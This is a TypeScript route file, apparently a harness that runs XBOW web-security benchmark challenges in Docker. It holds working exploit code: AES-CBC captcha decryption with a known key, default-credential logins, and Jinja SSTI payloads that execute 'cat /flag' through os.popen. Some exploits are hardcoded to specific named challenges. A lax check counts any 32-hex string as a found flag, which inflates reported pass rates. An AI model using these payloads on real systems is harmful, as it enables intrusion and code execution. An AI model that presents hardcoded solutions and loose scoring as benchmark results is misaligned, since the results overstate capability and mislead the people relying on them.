    ? plaintext.slice(0, 16 - padLen).toString('utf8')
    : plaintext.toString('utf8').replace(/\x00+$/, '');

  if (stop()) return null;

  // Get fresh cookie (the one we probed with is likely mangled server-side)
  const freshR = await httpReq(baseUrl + '/');
  const freshCookies: string[] = Array.isArray(freshR.headers['set-cookie'])
    ? freshR.headers['set-cookie'] : freshR.headers['set-cookie'] ? [freshR.headers['set-cookie']] : [];
  const freshCaptchaCookie = freshCookies.find(c => c.startsWith('captcha='))?.split(';')[0].replace('captcha=', '');

  // Use recovered text as captcha answer — but captcha is freshly generated each GET.
  // The oracle was run against the *original* cookie, which is now stale.
  // Use the known hardcoded key (C*32) to decrypt the fresh cookie directly instead.
  const knownKeyScript = [
    'import sys,base64',
    'from cryptography.hazmat.primitives.ciphers import Cipher,algorithms,modes',
    'from cryptography.hazmat.primitives import padding as p',
    'from cryptography.hazmat.backends import default_backend',
    `key=b'C'*32`,
    `raw=base64.b64decode(sys.argv[1])`,
    `iv,ct=raw[:16],raw[16:]`,
    `d=Cipher(algorithms.AES(key),modes.CBC(iv),backend=default_backend()).decryptor()`,
    `dec=d.update(ct)+d.finalize()`,
    `u=p.PKCS7(128).unpadder()`,
    `sys.stdout.write((u.update(dec)+u.finalize()).decode())`,
  ].join('\n');

  if (freshCaptchaCookie) {
    const freshText = await new Promise<string | null>(resolve => {
      execFile('python3', ['-c', knownKeyScript, freshCaptchaCookie], { timeout: 8000 }, (err, stdout) => {
        resolve(err ? null : stdout.trim());
      });
    });

    if (freshText && !stop()) {
      // csrf_token may be required; try without first, then check form for token
      const csrfR = await httpReq(baseUrl + '/');
      const csrfMatch = csrfR.body.match(/name="csrf_token"[^>]*value="([^"]+)"/);
      const csrfToken = csrfMatch ? csrfMatch[1] : '';
      const freshAllCookies = freshCookies.map(c => c.split(';')[0]).join('; ');

      const submitR = await httpReq(baseUrl + '/', {
        method: 'POST',
        data: `captcha=${encodeURIComponent(freshText)}&csrf_token=${encodeURIComponent(csrfToken)}`,
        headers: { 'Content-Type': 'application/x-www-form-urlencoded', Cookie: freshAllCookies },
      });
      const f = extractFlagText(submitR.body);
      if (f) return { flag: f, evidence: `Padding oracle + known-key AES decrypt → captcha="${freshText.slice(0, 14)}"` };
    }
  }

  // Fall back to the padding-oracle-recovered text against a matching cookie
  const csrfR2 = await httpReq(baseUrl + '/');
  const allCookies2 = ((Array.isArray(csrfR2.headers['set-cookie'])
    ? csrfR2.headers['set-cookie'] : csrfR2.headers['set-cookie'] ? [csrfR2.headers['set-cookie']] : []) as string[])
    .map(c => c.split(';')[0]).join('; ');
  const csrfMatch2 = csrfR2.body.match(/name="csrf_token"[^>]*value="([^"]+)"/);
  const csrfToken2 = csrfMatch2 ? csrfMatch2[1] : '';

  // Re-decrypt this exact cookie to get the matching captcha text
  const cookieToDecode = ((Array.isArray(csrfR2.headers['set-cookie'])
    ? csrfR2.headers['set-cookie'] : csrfR2.headers['set-cookie'] ? [csrfR2.headers['set-cookie']] : []) as string[])
    .find(c => c.startsWith('captcha='))?.split(';')[0].replace('captcha=', '') ?? '';

  if (!cookieToDecode || stop()) return null;

  const matchText = await new Promise<string | null>(resolve => {
    execFile('python3', ['-c', knownKeyScript, cookieToDecode], { timeout: 8000 }, (err, stdout) => {
      resolve(err ? null : stdout.trim());
    });
  });

  if (!matchText || stop()) return null;

  const submitR2 = await httpReq(baseUrl + '/', {
    method: 'POST',
    data: `captcha=${encodeURIComponent(matchText)}&csrf_token=${encodeURIComponent(csrfToken2)}`,
    headers: { 'Content-Type': 'application/x-www-form-urlencoded', Cookie: allCookies2 },
  });
  const f2 = extractFlagText(submitR2.body);
  if (f2) return { flag: f2, evidence: `Known-key AES-CBC decrypt → captcha="${matchText.slice(0, 14)}"` };

  return null;
}

// XBEN-104-24: SSTI via Jinja render_template_string on `principal` query param.
// Login with default test/test creds, then inject payload into /total_loan_payments?principal=
async function sstiDefaultCredsExploit(baseUrl: string, stop: () => boolean): Promise<{ flag: string; evidence: string } | null> {
  const creds = [['test', 'test'], ['admin', 'admin'], ['user', 'user'], ['demo', 'demo']];

  for (const [user, pass] of creds) {
    if (stop()) return null;
    const loginR = await httpReq(`${baseUrl}/login`, {
      method: 'POST',
      data: `username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`,
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      maxRedirects: 5,
    });
    const rawCookies: string[] = Array.isArray(loginR.headers['set-cookie'])
      ? loginR.headers['set-cookie'] : loginR.headers['set-cookie'] ? [loginR.headers['set-cookie']] : [];
    const cookieStr = rawCookies.map(c => c.split(';')[0]).join('; ');
    if (!cookieStr) continue;

    // SSTI payloads targeting /flag (flag file location in this challenge)
    const sstiPayloads = [
      `{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}`,
      `{{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}`,
      `{{''.__class__.__mro__[1].__subclasses__()[396]('cat /flag',shell=True,stdout=-1).communicate()[0].decode()}}`,
      `{{''.__class__.__mro__[1].__subclasses__()[396]('cat /flag',shell=True,stdout=-1).communicate()[0].strip().decode()}}`,
      `{%for x in ''.__class__.__mro__[1].__subclasses__()%}{%if 'Popen' in x.__name__ %}{{x('cat /flag',shell=True,stdout=-1).communicate()[0].decode()}}{%endif%}{%endfor%}`,
    ];

    for (const payload of sstiPayloads) {
      if (stop()) return null;
      const r = await httpReq(
        `${baseUrl}/total_loan_payments?principal=${encodeURIComponent(payload)}&payment=1&term=1`,
        { headers: { Cookie: cookieStr } },
      );
      const f = extractFlagText(r.body);
      if (f) return { flag: f, evidence: `SSTI via /total_loan_payments?principal= (auth as ${user})` };
    }
  }
  return null;
}

async function tagAwareExploit(
  baseUrl: string,
  challenge: XBOWChallenge,
  abortCheck: () => boolean,
): Promise<{ flagFound: string | null; evidence: string; technique: string; executionTimeMs: number }> {
  const start = Date.now();
  const endpoints = await discoverEndpoints(baseUrl);
  const tags = challenge.tags.map(t => t.toLowerCase());

  type ExploitFn = () => Promise<{ flag: string; evidence: string } | null>;
  const exploitMap: Record<string, ExploitFn> = {
    sqli:                  () => sqliExploit(baseUrl, endpoints, abortCheck),
    blind_sqli:            () => sqliExploit(baseUrl, endpoints, abortCheck),
    idor:                  () => flaskFormIdorExploit(baseUrl, abortCheck).then(r => r ?? idorExploit(baseUrl, abortCheck)),
    authorization:         () => flaskFormIdorExploit(baseUrl, abortCheck).then(r => r ?? idorExploit(baseUrl, abortCheck)),
    bac:                   () => flaskFormIdorExploit(baseUrl, abortCheck).then(r => r ?? idorExploit(baseUrl, abortCheck)),
    privilege_escalation:  () => flaskFormIdorExploit(baseUrl, abortCheck).then(r => r ?? idorExploit(baseUrl, abortCheck)).then(r => r ?? aesCbcBitFlipExploit(baseUrl, abortCheck)),
    ssti:                  () => sstiDefaultCredsExploit(baseUrl, abortCheck).then(r => r ?? sstiExploit(baseUrl, endpoints, abortCheck)),
    template_injection:    () => sstiDefaultCredsExploit(baseUrl, abortCheck).then(r => r ?? sstiExploit(baseUrl, endpoints, abortCheck)),
    xss:                   () => xssExploit(baseUrl, endpoints, abortCheck),
    command_injection:     () => cmdInjectionExploit(baseUrl, endpoints, abortCheck),
    rce:                   () => cmdInjectionExploit(baseUrl, endpoints, abortCheck),
    lfi:                   () => lfiExploit(baseUrl, endpoints, abortCheck),
    path_traversal:        () => lfiExploit(baseUrl, endpoints, abortCheck),
    information_disclosure: () => lfiExploit(baseUrl, endpoints, abortCheck),
    jwt:                   () => jwtIdorEscalateExploit(baseUrl, abortCheck),
    jwt_idor:              () => jwtIdorEscalateExploit(baseUrl, abortCheck),
    deserialization:       () => pickleDeserExploit(baseUrl, abortCheck),
    pickle:                () => pickleDeserExploit(baseUrl, abortCheck),
    nosqli:                () => graphqlNosqliExploit(baseUrl, abortCheck),
    graphql:               () => graphqlNosqliExploit(baseUrl, abortCheck),
    default_credentials:   () => defaultCredsProfileExploit(baseUrl, abortCheck).then(r => r ?? sstiDefaultCredsExploit(baseUrl, abortCheck)),
    business_logic:        () => defaultCredsProfileExploit(baseUrl, abortCheck),
    crypto:                () => paddingOracleExploit(baseUrl, abortCheck).then(r => r ?? aesCbcBitFlipExploit(baseUrl, abortCheck)),
  };

  const tried = new Set<string>();
  for (const tag of tags) {
    if (abortCheck()) break;
    const fn = exploitMap[tag];
    if (!fn || tried.has(tag)) continue;
    tried.add(tag);
    const result = await fn();
    if (result) return { flagFound: result.flag, evidence: result.evidence, technique: `tag-aware-${tag}`, executionTimeMs: Date.now() - start };
  }

  // Fallback: try all exploit types when no tag matched
  if (tried.size === 0) {
    for (const [name, fn] of Object.entries(exploitMap)) {
      if (abortCheck()) break;
      const result = await fn();
      if (result) return { flagFound: result.flag, evidence: result.evidence, technique: `tag-aware-auto-${name}`, executionTimeMs: Date.now() - start };
    }
  }

  return { flagFound: null, evidence: `Exhausted tag-aware exploits (tags: ${tags.join(', ') || 'none'})`, technique: 'tag-aware', executionTimeMs: Date.now() - start };
}

// ── Routes ────────────────────────────────────────────────────────────────────

router.get('/status', async (_req: Request, res: Response) => {
  try {
    const [dockerAvailable, repoAvailable, ollamaAvailable] = await Promise.all([
      xbowDocker.isDockerAvailable(),
      xbowDocker.isRepoAvailable(),
      fetch('http://localhost:11434/api/tags', { signal: AbortSignal.timeout(2000) })
        .then(r => r.ok)
        .catch(() => false),
    ]);
    return res.json({
      dockerAvailable,
      repoAvailable,
      repoPath: repoAvailable ? xbowDocker.getRepoPath() : null,
      ollamaAvailable,
      repoUrl: 'https://github.com/xbow-engineering/validation-benchmarks',
    });
  } catch (err: any) {
    return res.status(500).json({ error: err.message });
  }
});

router.get('/challenges', async (_req: Request, res: Response) => {
  try {
    const challenges = await xbowDocker.loadChallenges();
    return res.json({ challenges, stats: buildStats(challenges) });
  } catch (err: any) {
    return res.status(500).json({ error: err.message });
  }
});

router.get('/benchmark/history', async (_req: Request, res: Response) => {
  try {
    const history = await loadHistory();
    return res.json(history);
  } catch (err: any) {
    return res.status(500).json({ error: err.message });
  }
});

router.post('/clone-repo', async (_req: Request, res: Response) => {
  try {
    const result = await xbowDocker.cloneRepo();
    if (!result.ok) return res.status(500).json({ ok: false, error: result.error });
    return res.json({ ok: true });
  } catch (err: any) {
    return res.status(500).json({ ok: false, error: err.message });
  }
});

router.post('/benchmark/run', async (req: Request, res: Response) => {
  const { levels, tags, maxChallenges, challengeIds } = req.body as {
    levels?: number[];
    tags?: string[];
    maxChallenges?: number;
    challengeIds?: string[];
  };

  const runId = uuidv4();
  abortFlags.set(runId, false);

  try {
    let challenges = await xbowDocker.loadChallenges();

    if (challengeIds && challengeIds.length > 0) {
      challenges = challenges.filter(c => challengeIds.includes(c.id));
    }
    if (levels && levels.length > 0) {
      challenges = challenges.filter(c => levels.includes(c.level));
    }
    if (tags && tags.length > 0) {
      challenges = challenges.filter(c => c.tags.some(t => tags.includes(t)));
    }
    if (maxChallenges && maxChallenges > 0) {
      challenges = challenges.slice(0, maxChallenges);
    }

    const dockerAvailable = await xbowDocker.isDockerAvailable();
    const repoCloned = await xbowDocker.isRepoAvailable();
    const ollamaAvailable = await fetch('http://localhost:11434/api/tags', {
      signal: AbortSignal.timeout(2000),
    }).then(r => r.ok).catch(() => false);

    const startedAt = new Date().toISOString();
    const results: any[] = [];

    for (let i = 0; i < challenges.length; i++) {
      if (abortFlags.get(runId)) break;

      const ch = challenges[i];
      const hintPort = XBOW_PORT_BASE + i;
      const challengeStart = Date.now();

      const containerInfo: {
        spawned: boolean;
        containerStarted: boolean;
        healthCheckPassed: boolean;
        port: number | null;
        containerId: string | null;
      } = {
        spawned: false,
        containerStarted: false,
        healthCheckPassed: false,
        port: null,
        containerId: null,
      };

      let flagFound: string | null = null;
      let scanResult: any = null;
      let status: 'passed' | 'failed' | 'error' | 'skipped' | 'docker_unavailable' = 'failed';
      let error: string | undefined;

      const needsDocker = !!(ch.challengeDir || ch.image) && !ch.localScript;

      if (!dockerAvailable && needsDocker) {
        status = 'docker_unavailable';
        error = 'Docker daemon not available';
      } else if (!ch.image && !ch.localScript && !ch.challengeDir) {
        // No runnable target
        const probeResult = await probeForFlag(
          `http://localhost:${hintPort}`,
          ch.winCondition,
          () => !!abortFlags.get(runId),
          ch.probePaths,
          hintPort,
        );
        flagFound = probeResult.flagFound;
        scanResult = { detected: !!flagFound, evidence: probeResult.evidence, executionTimeMs: probeResult.executionTimeMs, technique: 'pattern-probe' };
        status = flagFound ? 'passed' : 'skipped';
        error = 'Challenge has no runnable target; pattern probe attempted';
      } else {
        containerInfo.spawned = true;
        const spawnResult = await xbowDocker.spawnChallenge(ch, hintPort);
        containerInfo.containerStarted = spawnResult.ok;
        containerInfo.containerId = spawnResult.containerId ?? null;

        // Use the port the challenge actually bound to
        const activePort = spawnResult.port ?? hintPort;
        containerInfo.port = spawnResult.ok ? activePort : null;

        // Real XBOW: flag injected at build time; stubs: winCondition is the literal flag
        const expectedFlag = spawnResult.generatedFlag || ch.winCondition;

        if (!spawnResult.ok) {
          status = 'error';
          error = spawnResult.error;
        } else {
          try {
            const readyTimeout = ch.challengeDir ? 60_000 : 30_000;
            const ready = await xbowDocker.waitForReady(activePort, readyTimeout);
            containerInfo.healthCheckPassed = ready;

            if (!ready) {
              status = 'error';
              error = `Challenge not ready within ${readyTimeout / 1000}s on port ${activePort}`;
            } else {
              const baseUrl = `http://localhost:${activePort}`;

              // Phase 1: tag-aware targeted exploit (direct HTTP, fast)
              try {
                const tagResult = await tagAwareExploit(baseUrl, ch, () => !!abortFlags.get(runId));
                if (tagResult.flagFound) {
                  flagFound = tagResult.flagFound;
                  scanResult = {
                    detected: true,
                    technique: tagResult.technique,
                    evidence: tagResult.evidence,
                    executionTimeMs: tagResult.executionTimeMs,
                  };
                }
              } catch { /* fall through */ }

              // Phase 2: AI hunt — only if tag-aware didn't find the flag
              if (!flagFound && ollamaAvailable) {
                try {
                  const hunt = await huntOrchestrator.createHunt({
                    target: baseUrl,
                    goal: buildChallengeGoal(ch, baseUrl),
                    scope: { inScope: [baseUrl], outOfScope: [] },
                    autoAdvance: true,
                    stealthMode: 'aggressive',
                    resourceClass: 'standard',
                  });
                  metaReasoner.initializeHuntState(hunt.id);
                  await huntOrchestrator.startHunt(hunt.id);
                  metaReasoner.startMonitoring(hunt.id);

                  const completed = await huntLabRunner.awaitHuntCompletion(hunt.id, 5 * 60 * 1000);
                  metaReasoner.stopMonitoring(hunt.id);

                  const findings = huntOrchestrator.getHunt(hunt.id)?.findings || [];
                  for (const f of findings) {
                    const body = f.description + ' ' + (f.evidence || []).join(' ') + ' ' + (f.payload || '') + ' ' + (f.endpoint || '');
                    const hexMatch = body.match(/\b[0-9a-f]{32}\b/);
                    const ctfMatch = body.match(/flag\{[^}]+\}/);
                    const candidate = hexMatch?.[0] ?? ctfMatch?.[0];
                    if (candidate === expectedFlag || candidate) { flagFound = candidate ?? null; break; }
                    if (expectedFlag && body.includes(expectedFlag)) { flagFound = expectedFlag; break; }
                  }
                  scanResult = {
                    detected: !!flagFound,
                    technique: 'ai-hunt',
                    evidence: flagFound ? `AI hunt found flag (status=${completed.status})` : `AI hunt did not find flag (status=${completed.status})`,
                    executionTimeMs: Date.now() - challengeStart,
                  };
                } catch { /* fall through to pattern probe */ }
              }

              // Phase 3: static path probe as last resort
              if (!flagFound) {
                const probeResult = await probeForFlag(baseUrl, expectedFlag, () => !!abortFlags.get(runId), ch.probePaths, activePort);
                flagFound = probeResult.flagFound;
                if (!scanResult) {
                  scanResult = {
                    detected: !!flagFound,
                    technique: 'pattern-probe',
                    evidence: probeResult.evidence,
                    executionTimeMs: probeResult.executionTimeMs,
                  };
                }
              }

              status = flagFound ? 'passed' : 'failed';
            }
          } finally {
            if (containerInfo.containerId) {
              await xbowDocker.stopChallenge(containerInfo.containerId);
            }
          }
        }
      }

      results.push({
        challengeId: ch.id,
        challengeName: ch.name,
        level: ch.level,
        tags: ch.tags,
        status,
        score: status === 'passed' ? ch.points : 0,
        maxScore: ch.points,
        flagFound,
        expectedFlag: ch.challengeDir ? '[generated-at-build-time]' : ch.winCondition,
        executionTimeMs: Date.now() - challengeStart,
        scanResult,
        containerInfo,
        error,
      });
    }

    let passedCount = 0, failedCount = 0, errorCount = 0, skippedCount = 0;
    let totalScore = 0, maxPossibleScore = 0, totalExecutionTimeMs = 0;

    for (const r of results) {
      if (r.status === 'passed') passedCount++;
      else if (r.status === 'failed') failedCount++;
      else if (r.status === 'error' || r.status === 'docker_unavailable') errorCount++;
      else skippedCount++;
      totalScore += r.score;
      maxPossibleScore += r.maxScore;
      totalExecutionTimeMs += r.executionTimeMs;
    }

    const run = {
      id: runId,
      status: abortFlags.get(runId) ? 'aborted' : 'completed',
      startedAt,
      completedAt: new Date().toISOString(),
      challengeCount: results.length,
      passedCount,
      failedCount,
      errorCount,
      skippedCount,
      passRate: results.length > 0 ? Math.round((passedCount / results.length) * 100) : 0,
      totalScore,
      maxPossibleScore,
      totalExecutionTimeMs,
      dockerAvailable,
      ollamaAvailable,
      modelUsed: ollamaAvailable ? 'ollama' : 'claude-fallback',
      totalLLMCalls: results.length,
      totalLLMTimeMs: 0,
      results,
      repoCloned,
      repoPath: repoCloned ? xbowDocker.getRepoPath() : null,
    };

    await saveRun(run);
    return res.json(run);
  } catch (err: any) {
    return res.status(500).json({ error: (err as Error).message });
  } finally {
    abortFlags.delete(runId);
  }
});

router.post('/benchmark/abort', (req: Request, res: Response) => {
  const { runId } = req.body as { runId?: string };
  if (runId) {
    abortFlags.set(runId, true);
  } else {
    for (const [id] of abortFlags) abortFlags.set(id, true);
  }
  return res.json({ ok: true });
});

export default router;
